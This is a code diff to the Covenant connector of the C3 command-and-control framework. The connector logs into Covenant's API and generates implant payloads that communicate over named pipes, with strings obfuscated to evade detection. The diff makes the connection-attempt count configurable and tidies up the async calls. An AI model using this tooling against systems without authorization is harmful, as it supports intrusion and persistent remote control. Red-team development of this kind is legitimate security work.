@@ -91,7 +91,7 @@ namespace MWR::C3::Interfaces::Connectors
 		/// @param jitter percent to jitter the delay by
 		/// @param listenerId the id of the Bridge listener for covenant
 		/// @return generated payload.
-		MWR::ByteVector GeneratePayload(ByteView binderId, std::string pipename, uint32_t delay, uint32_t jitter, uint32_t listenerId);
+		MWR::ByteVector GeneratePayload(ByteView binderId, std::string pipename, uint32_t delay, uint32_t jitter, uint32_t listenerId, uint32_t connectAttempts);
 
 		/// Close desired connection
 		/// @arguments arguments for command. connection Id in string form.
@@ -140,13 +140,9 @@ MWR::C3::Interfaces::Connectors::Covenant::Covenant(ByteView arguments)
 {
 	json postData;
 	json response;
-	std::string postDataDump;
-	std::string binary;
 
 	std::tie(m_ListeningPostAddress, m_ListeningPostPort, m_webHost, m_username, m_password) = arguments.Read<std::string, uint16_t, std::string, std::string, std::string>();
-	InitializeSockets();
-
-
+	
 	/***Authenticate to Web API ***/
 	std::string url = this->m_webHost + OBF("/api/users/login");
 	
@@ -160,16 +156,10 @@ MWR::C3::Interfaces::Connectors::Covenant::Covenant(ByteView arguments)
 	web::http::http_request request;
 
 	request = web::http::http_request(web::http::methods::POST);
-	postDataDump = postData.dump();
 	request.headers().set_content_type(utility::conversions::to_string_t(OBF("application/json")));
-	request.set_body(utility::conversions::to_string_t(postDataDump));
+	request.set_body(utility::conversions::to_string_t(postData.dump()));
 	
-	pplx::task<web::http::http_response> task = webClient.request(request).then([&](web::http::http_response response)
-		{
-			return response;
-		});
-
-	task.wait();
+	pplx::task<web::http::http_response> task = webClient.request(request);
 	web::http::http_response resp = task.get();
 
 	if (resp.status_code() == web::http::status_codes::OK)
@@ -186,6 +176,8 @@ MWR::C3::Interfaces::Connectors::Covenant::Covenant(ByteView arguments)
 		this->m_token = response[OBF("covenantToken")].get<std::string>();
 	else
 		throw std::exception(OBF("[Covenant] Could not get token, invalid logon"));
+
+	InitializeSockets();
 }
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
@@ -225,14 +217,13 @@ bool MWR::C3::Interfaces::Connectors::Covenant::DeinitializeSockets()
 }
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-MWR::ByteVector MWR::C3::Interfaces::Connectors::Covenant::GeneratePayload(ByteView binderId, std::string pipename, uint32_t delay, uint32_t jitter, uint32_t listenerId)
+MWR::ByteVector MWR::C3::Interfaces::Connectors::Covenant::GeneratePayload(ByteView binderId, std::string pipename, uint32_t delay, uint32_t jitter, uint32_t listenerId, uint32_t connectAttempts)
 {
 	if (binderId.empty() || pipename.empty())
 		throw std::runtime_error{ OBF("Wrong parameters, cannot create payload") };
 
 	std::string authHeader = OBF("Bearer ") + this->m_token;
 	std::string contentHeader = OBF("Content-Type: application/json");
-	std::string postDataDump;
 	std::string binary;
 
 	web::http::client::http_client_config config;
@@ -251,34 +242,24 @@ MWR::ByteVector MWR::C3::Interfaces::Connectors::Covenant::GeneratePayload(ByteV
 	postData[OBF("type")] = OBF("Wmic");
 	postData[OBF("delay")] = delay;
 	postData[OBF("jitterPercent")] = jitter; 
-	postData[OBF("connectAttempts")] = 5000; 
+	postData[OBF("connectAttempts")] = connectAttempts; 
 
 	//First we use a PUT to add our data as the template.
 	request = web::http::http_request(web::http::methods::PUT);
-	postDataDump = postData.dump();
 	try
 	{
 		request.headers().set_content_type(utility::conversions::to_string_t("application/json"));
-		request.set_body(utility::conversions::to_string_t(postDataDump));
+		request.set_body(utility::conversions::to_string_t(postData.dump()));
 
 		request.headers().add(OBF_W(L"Authorization"), utility::conversions::to_string_t(authHeader));
-		pplx::task<web::http::http_response> task = webClient.request(request).then([&](web::http::http_response response)
-			{
-				return response;
-			});
-
-		task.wait();
+		pplx::task<web::http::http_response> task = webClient.request(request);
 		web::http::http_response resp = task.get();
-
+		
 		//If we get 200 OK, then we use a POST to request the generation of the payload. We can reuse the previous data here.
 		if (resp.status_code() == web::http::status_codes::OK)
 		{
 			request.set_method(web::http::methods::POST);
-			task = webClient.request(request).then([&](web::http::http_response response)
-				{
-					return response;
-				});
-			task.wait();
+			task = webClient.request(request);
 			resp = task.get();
 			
 			auto respData = resp.extract_string();
@@ -293,7 +274,7 @@ MWR::ByteVector MWR::C3::Interfaces::Connectors::Covenant::GeneratePayload(ByteV
 		m_ConnectionMap.emplace(std::string{ binderId }, std::move(connection));
 		return payload;
 	}
-	catch(std::exception e)
+	catch(std::exception&)
 	{
 		throw std::exception(OBF("Error generating payload"));
 	}
@@ -504,9 +485,9 @@ bool MWR::C3::Interfaces::Connectors::Covenant::Connection::SecondThreadStarted(
 
 MWR::ByteVector MWR::C3::Interfaces::Connectors::Covenant::PeripheralCreationCommand(ByteView connectionId, ByteView data, bool isX64)
 {
-	auto [pipeName, listenerId, delay, jitter] = data.Read<std::string, uint32_t, uint32_t, uint32_t>();
+	auto [pipeName, listenerId, delay, jitter, connectAttempts] = data.Read<std::string, uint32_t, uint32_t, uint32_t, uint32_t>();
 
 	
-	return ByteVector{}.Write(pipeName, GeneratePayload(connectionId, pipeName, delay, jitter, listenerId));
+	return ByteVector{}.Write(pipeName, GeneratePayload(connectionId, pipeName, delay, jitter, listenerId, connectAttempts), connectAttempts);
 }
 
